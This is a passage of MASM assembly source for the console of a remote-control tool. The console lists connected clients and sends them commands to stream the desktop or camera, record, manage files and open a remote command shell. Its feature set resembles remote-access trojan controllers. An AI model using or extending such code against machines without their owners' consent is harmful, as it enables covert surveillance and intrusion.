InitServer endp

DlgProc proc uses ebx esi edi hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM
	LOCAL 	@lsls,@ebx
	LOCAL	@rect:RECT
	LOCAL	@stPos:POINT
	LOCAL	@ntid:NOTIFYICONDATA
	mov		eax,uMsg
	.if eax==WM_INITDIALOG
		m2m hhWnd,hWnd
		invoke InitServer
	.elseif eax==WM_CLOSE
		invoke EndDialog,hWnd,0	
		mov @ntid.cbSize,sizeof NOTIFYICONDATA
		m2m @ntid.hwnd,hWnd
		mov @ntid.uID,1289
		invoke Shell_NotifyIcon,NIM_DELETE,addr @ntid
	.elseif eax==ADDLIST
		mov esi,wParam
		assume esi:ptr OVERLAPPEDPLUS
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,72
		mov edi,eax
		invoke lstrcat,edi,CTEXT("连接:")
		mov ebx,edi
		add ebx,5
		invoke wsprintf,ebx,CTEXT("%d"),dwconncount
		invoke SendMessage,hwinstatus,SB_SETTEXT,0,edi
		invoke GlobalFree,edi
		invoke SendDlgItemMessage,[esi].hmainform,IDC_LST1,LB_ADDSTRING,0,[esi].lpipport
		invoke SendDlgItemMessage,[esi].hmainform,IDC_LST1,LB_FINDSTRINGEXACT,0,[esi].lpipport
		mov edi,eax
		.if edi!=LB_ERR
			invoke SendDlgItemMessage,[esi].hmainform,IDC_LST1,LB_SETITEMDATA,edi,esi
		.endif
		assume esi:nothing
	.elseif eax==DELETELIST
		mov esi,wParam
		assume esi:ptr OVERLAPPEDPLUS
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,72
		mov edi,eax
		invoke lstrcat,edi,CTEXT("连接:")
		mov ebx,edi
		add ebx,5
		invoke wsprintf,ebx,CTEXT("%d"),dwconncount
		invoke SendMessage,hwinstatus,SB_SETTEXT,0,edi
		invoke GlobalFree,edi
		invoke SendDlgItemMessage,[esi].hmainform,IDC_LST1,LB_FINDSTRINGEXACT,0,[esi].lpipport
		mov edi,eax
		.if edi!=LB_ERR
			invoke SendDlgItemMessage,[esi].hmainform,IDC_LST1,LB_DELETESTRING,edi,0
		.endif
		assume esi:nothing
	.elseif eax==CREATEWINDOWDESKTOP
		mov esi,wParam
		assume esi:ptr OVERLAPPEDPLUS
		invoke CreateDialogParam,hInstance,IDD_DLG2,0,addr ProcDlgDesktop,NULL
		mov [esi].hform,eax
		invoke SetWindowLong,eax,GWL_USERDATA,esi
		.if lParam==1
		    .if bform
			    invoke SetWindowPos,[esi].hform,HWND_TOP,formx,formy,NULL,NULL,SWP_NOSIZE
				add formx,12
				add formy,14
		    	mov ebx,formx
		    	mov edi,formy
		    	.if ebx>nDesktopWidth || edi>nDesktopHeight
		    		mov formx,0
		    		mov formy,0
		    	.endif
			.endif
		.elseif lParam==2
			.if bcamera
			    invoke SetWindowPos,[esi].hform,HWND_TOP,camerax,cameray,NULL,NULL,SWP_NOSIZE
				add camerax,12
				add cameray,14
		    	mov ebx,camerax
		    	mov edi,cameray
		    	.if ebx>nDesktopWidth || edi>nDesktopHeight
		    		mov camerax,0
		    		mov cameray,0
		    	.endif
			.endif	
		.endif
	    invoke ShowWindow,[esi].hform,SW_SHOW
		assume esi:nothing
	.elseif eax==DESTROYWINDOW
		mov esi,wParam
		assume esi:ptr OVERLAPPEDPLUS
		invoke DestroyWindow,[esi].hform
		mov [esi].hform,0
		assume esi:nothing
	.elseif eax==CREATEWINDOWFILE
		mov esi,wParam
		assume esi:ptr OVERLAPPEDPLUS
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,MAX_PATH
		mov [esi].lpfiledir,eax
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,MAX_PATH
		mov [esi].lpfilename,eax
		invoke CreateDialogParam,hInstance,IDD_DLG3,0,addr ProcDlgFile,NULL
		mov [esi].hform,eax
		invoke SetWindowLong,eax,GWL_USERDATA,esi	
		invoke GetDlgItem,[esi].hform,3001
		mov [esi].htreeview,eax
		invoke GetDlgItem,[esi].hform,3002
		mov [esi].hshangchuan,eax
		invoke GetDlgItem,[esi].hform,3003
		mov [esi].hxiazai,eax
		invoke GetDlgItem,[esi].hform,3004
		mov [esi].hwinstatus,eax
		invoke GetDlgItem,[esi].hform,3005
		mov [esi].hstatic,eax
		invoke GetDlgItem,[esi].hform,3006
		mov [esi].hrecivestatic,eax
		invoke GetDlgItem,[esi].hform,3008
		mov [esi].hyunxing,eax
		invoke GetDlgItem,[esi].hform,3010
		mov [esi].hdelfile,eax
	    invoke ShowWindow,[esi].hform,SW_SHOW
		assume esi:nothing
	.elseif eax==WM_SYSCOMMAND
		mov eax,wParam
		.if eax==IDM_ABOUT
;			invoke ShellExecute,NULL,CTEXT("open"),addr szhttp,NULL,NULL,SW_SHOWNORMAL
		.endif
		invoke DefWindowProc,hWnd,uMsg,wParam,lParam
	.elseif eax==WM_COMMAND
		mov eax,wParam
		.if	ax==IDC_LST1
			shr	eax,16	
			.if	ax==LBN_SELCHANGE
				invoke GetCursorPos,addr @stPos
				invoke TrackPopupMenu,hlmenu,TPM_LEFTALIGN,@stPos.x,@stPos.y,NULL,hWnd,NULL
		    .endif	
		.elseif ax==IDM_DESKTOP	
			mov bform,0
			invoke SendDlgItemMessage,hWnd,IDC_LST1,LB_GETSELCOUNT,0,0
			.if eax!=LB_ERR && eax!=0
				mov @ebx,eax
				.if @ebx>1
					mov formx,0
					mov formy,0
					mov bform,1
				.endif
				mov eax,@ebx
				xor edx,edx
				mov edi,4
				mul edi
				add eax,8
				invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,eax
				mov @lsls,eax
				mov edi,eax
				invoke SendDlgItemMessage,hWnd,IDC_LST1,LB_GETSELITEMS,@ebx,@lsls
				.if eax!=LB_ERR
					.while @ebx>0
						dec @ebx
						mov eax,dword ptr[edi]
						invoke SendDlgItemMessage,hWnd,IDC_LST1,LB_GETITEMDATA,eax,0
						.if eax!=LB_ERR
							mov esi,eax
							invoke IsBadReadPtr,esi,sizeof OVERLAPPEDPLUS
							.if eax==0
								assume esi:ptr OVERLAPPEDPLUS		
								invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,2
								invoke WSASends,[esi].hsocket,eax,2,SOCKETTAG.desktopconn
								assume esi:nothing
							.endif
						.endif
						add edi,4
					.endw
				.endif
				invoke GlobalFree,@lsls		
			.endif
		.elseif ax==IDM_VCAM
			mov bcamera,0
			invoke SendDlgItemMessage,hWnd,IDC_LST1,LB_GETSELCOUNT,0,0
			.if eax!=LB_ERR && eax!=0
				mov @ebx,eax
				.if @ebx>1
					mov camerax,0
					mov cameray,0
					mov bcamera,1
				.endif
				mov eax,@ebx
				xor edx,edx
				mov edi,4
				mul edi
				add eax,8
				invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,eax
				mov @lsls,eax
				mov edi,eax
				invoke SendDlgItemMessage,hWnd,IDC_LST1,LB_GETSELITEMS,@ebx,@lsls
				.if eax!=LB_ERR
					.while @ebx>0
						dec @ebx
						mov eax,dword ptr[edi]
						invoke SendDlgItemMessage,hWnd,IDC_LST1,LB_GETITEMDATA,eax,0
						.if eax!=LB_ERR
							mov esi,eax
							invoke IsBadReadPtr,esi,sizeof OVERLAPPEDPLUS
							.if eax==0
								assume esi:ptr OVERLAPPEDPLUS		
								invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,2
								invoke WSASends,[esi].hsocket,eax,2,SOCKETTAG.cameraconn
								assume esi:nothing
							.endif
						.endif
						add edi,4
					.endw
				.endif
				invoke GlobalFree,@lsls		
			.endif
		.elseif ax==IDM_REC
			invoke SendDlgItemMessage,hWnd,IDC_LST1,LB_GETCURSEL,0,0
			.if eax!=LB_ERR
				invoke SendDlgItemMessage,hWnd,IDC_LST1,LB_GETITEMDATA,eax,0
				.if eax!=LB_ERR
					mov esi,eax
					assume esi:ptr OVERLAPPEDPLUS		
					invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,2
					invoke WSASends,[esi].hsocket,eax,2,SOCKETTAG.recconn
					assume esi:nothing
				.endif
			.endif
		.elseif ax==IDM_FILE
			invoke SendDlgItemMessage,hWnd,IDC_LST1,LB_GETCURSEL,0,0
			.if eax!=LB_ERR
				invoke SendDlgItemMessage,hWnd,IDC_LST1,LB_GETITEMDATA,eax,0
				.if eax!=LB_ERR
					mov esi,eax
					assume esi:ptr OVERLAPPEDPLUS		
					invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,2
					invoke WSASends,[esi].hsocket,eax,2,SOCKETTAG.fileconn
					assume esi:nothing
				.endif
			.endif
		.elseif ax==IDM_CMDRUN
			invoke SendDlgItemMessage,hWnd,IDC_LST1,LB_GETCURSEL,0,0
			.if eax!=LB_ERR
				invoke SendDlgItemMessage,hWnd,IDC_LST1,LB_GETITEMDATA,eax,0
				.if eax!=LB_ERR
					mov esi,eax
					assume esi:ptr OVERLAPPEDPLUS
					.if [esi].hform==0
						invoke CreateDialogParam,hInstance,6000,0,addr ProcDlgCmd,NULL
						mov [esi].hform,eax
						invoke SetWindowLong,eax,GWL_USERDATA,esi	
						invoke GetDlgItem,[esi].hform,6001
						mov [esi].hCmdRich,eax
						invoke GetDlgItem,[esi].hform,6002
						mov [esi].hCmdRich1,eax
						invoke SetWindowText,[esi].hform,[esi].lpipport
					    invoke ShowWindow,[esi].hform,SW_SHOW
						invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,2
						invoke WSASends,[esi].hsocket,eax,2,SOCKETTAG.cmdstart
					.endif
					assume esi:nothing
				.endif
			.endif
		.endif
	.elseif eax == WM_SIZE
		.if wParam==SIZE_MINIMIZED
			mov bmainshow,1
			invoke ShowWindow,hWnd,SW_HIDE
		.endif
		invoke GetClientRect,hWnd,addr @rect
		invoke GetDlgItem,hWnd,1002
		mov ebx,eax
		mov edi,@rect.bottom
		sub edi,42
		invoke SetWindowPos,ebx,HWND_NOTOPMOST,0,0,@rect.right,edi,SWP_NOZORDER
		invoke GetDlgItem,hWnd,1001
		mov ebx,eax
		mov edi,@rect.bottom
		sub edi,42
		invoke SetWindowPos,ebx,HWND_NOTOPMOST,0,edi,@rect.right,22,SWP_NOZORDER
		invoke GetDlgItem,hWnd,1004
		mov ebx,eax
		mov edi,@rect.bottom
		sub edi,20
		invoke SetWindowPos,ebx,HWND_NOTOPMOST,0,edi,@rect.right,20,SWP_NOZORDER
	.elseif eax == WM_HSCROLL
		invoke GetDlgItem,hWnd,1001
		invoke SendMessage,eax,TBM_GETPOS,0,0
		.if eax==0
			mov qinxidu,1
		.elseif eax==1
			mov qinxidu,4
		.elseif eax==2
			mov qinxidu,8
		.elseif eax==3
			mov qinxidu,16
		.elseif eax==4
			mov qinxidu,24
		.elseif eax==5
			mov qinxidu,32
		.endif
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,72
		mov edi,eax
		invoke lstrcat,edi,CTEXT("颜色:")
		mov ebx,edi
		add ebx,5
		invoke wsprintf,ebx,CTEXT("%d"),qinxidu
		invoke SendMessage,hwinstatus,SB_SETTEXT,1,edi
		invoke GlobalFree,edi
	.elseif eax==1290
		.if wParam==1289
			.if lParam==WM_LBUTTONDBLCLK 
				.if bmainshow==0
					mov bmainshow,1
					invoke ShowWindow,hWnd,SW_HIDE
				.else
					mov bmainshow,0
					invoke ShowWindow,hWnd,SW_SHOWNOACTIVATE	
				.endif
			.endif
		.endif
	.else
		mov		eax,FALSE
		ret
	.endif
	mov		eax,TRUE
	ret
DlgProc endp

start:
	invoke GetModuleHandle,NULL
	mov	hInstance,eax
    invoke InitCommonControls
	invoke LoadLibrary,CTEXT("RichEd20.dll")
	invoke DialogBoxParam,hInstance,IDD_DLG,NULL,addr DlgProc,NULL
	invoke closesocket,hsocket
	invoke WSACleanup
	invoke ExitProcess,0
end start
